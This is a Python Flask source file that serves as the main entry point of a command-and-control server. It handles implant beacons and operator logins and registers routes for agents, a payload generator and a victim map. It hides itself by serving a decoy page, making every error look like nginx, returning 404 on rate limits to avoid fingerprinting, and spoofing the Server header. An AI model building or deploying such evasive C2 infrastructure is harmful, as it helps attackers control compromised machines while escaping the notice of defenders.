import os
import sys
from datetime import timedelta
from flask import Flask, request, render_template, jsonify, redirect, url_for, abort
from dotenv import load_dotenv
from database import db


def _require_env(name: str) -> str:
    """Raise a clear RuntimeError if a required environment variable is missing."""
    val = os.environ.get(name)
    if not val:
        raise RuntimeError(
            f"\n[FATAL] Required environment variable '{name}' is not set.\n"
            f"        Run:  python setup_secrets.py\n"
        )
    return val


def create_app():
    load_dotenv()  # load server/.env if present — no-op if absent

    app = Flask(__name__)
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

    # ── All secrets are required. No hardcoded fallbacks. ─────────────────────
    app.config['API_KEY']           = _require_env('C2_API_KEY')
    app.config['SECRET_KEY']        = _require_env('SECRET_KEY')
    app.config['OPERATOR_KEY']      = _require_env('OPERATOR_KEY')
    app.config['OPERATOR_USER']     = _require_env('OPERATOR_USER')
    app.config['OPERATOR_PASS']     = _require_env('OPERATOR_PASS')
    app.config['ENCRYPTION_KEY']    = _require_env('ENCRYPTION_KEY')     # ECDH bootstrap key
    app.config['DB_ENCRYPTION_KEY'] = _require_env('DB_ENCRYPTION_KEY')  # SQLite field encryption
    app.config['ENCRYPT_BEACON']    = os.environ.get('ENCRYPT_BEACON', 'true').lower() == 'true'
    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=8)

    db.init_app(app)

    # ── Rate limiter ───────────────────────────────────────────────────────────
    from extensions import limiter
    limiter.init_app(app)

    # Rate limit violations return 404 — same as wrong token, no fingerprinting
    from flask_limiter.errors import RateLimitExceeded
    @app.errorhandler(RateLimitExceeded)
    def _rate_limit_handler(e):
        return jsonify({'error': 'Not Found'}), 404

    # ── Blueprints ─────────────────────────────────────────────────────────────
    from routes.agent     import agent_bp
    from routes.operator  import operator_bp
    from routes.auth      import auth_bp
    from routes.gallery   import gallery_bp
    from routes.generator import generator_bp
    from routes.eventlog  import eventlog_bp
    from routes.map       import map_bp

    for bp in (agent_bp, operator_bp, auth_bp, gallery_bp, generator_bp, eventlog_bp, map_bp):
        app.register_blueprint(bp)

    # ── C2 Profile: root route ─────────────────────────────────────────────────
    @app.route('/')
    def index():
        beacon_token = request.headers.get('X-Beacon-Token')
        operator_key = request.headers.get('X-Operator-Key')
        if beacon_token == app.config['API_KEY']:
            return jsonify({'status': 'ok', 'message': 'beacon acknowledged'})
        if operator_key == app.config['OPERATOR_KEY']:
            return redirect(url_for('auth.login'))
        return render_template('decoy.html')

    # ── Error handlers: all errors render the nginx-style decoy error page ─────
    @app.errorhandler(400)
    @app.errorhandler(401)
    @app.errorhandler(403)
    @app.errorhandler(404)
    @app.errorhandler(405)
    @app.errorhandler(500)
    def _error_handler(e):
        code = getattr(e, 'code', 500)
        messages = {
            400: 'Bad Request',
            401: 'Unauthorized',
            403: 'Forbidden',
            404: 'Not Found',
            405: 'Method Not Allowed',
            500: 'Internal Server Error',
        }
        return render_template('error.html', code=code, message=messages.get(code, 'Error')), code

    # ── Spoof Server header on every response ──────────────────────────────────
    @app.after_request
    def _spoof_server_header(response):
        response.headers['Server'] = 'nginx/1.24.0'
        return response

    with app.app_context():
        db.create_all()
        from database import Agent
        db.session.query(Agent).update({'status': 'inactive'})
        db.session.commit()

    return app


if __name__ == '__main__':
    app = create_app()

    cert = os.path.join(os.path.dirname(__file__), 'cert.pem')
    key  = os.path.join(os.path.dirname(__file__), 'key.pem')

    if not (os.path.exists(cert) and os.path.exists(key)):
        print("[!] TLS certificates not found. Run:  python gen_cert.py")
        sys.exit(1)

    print("[*] HTTPS enabled — all traffic encrypted (TLS 1.3)")
    print("[*] All secrets loaded from environment — no hardcoded fallbacks")
    app.run(host='0.0.0.0', port=5000, debug=False, ssl_context=(cert, key), threaded=True)
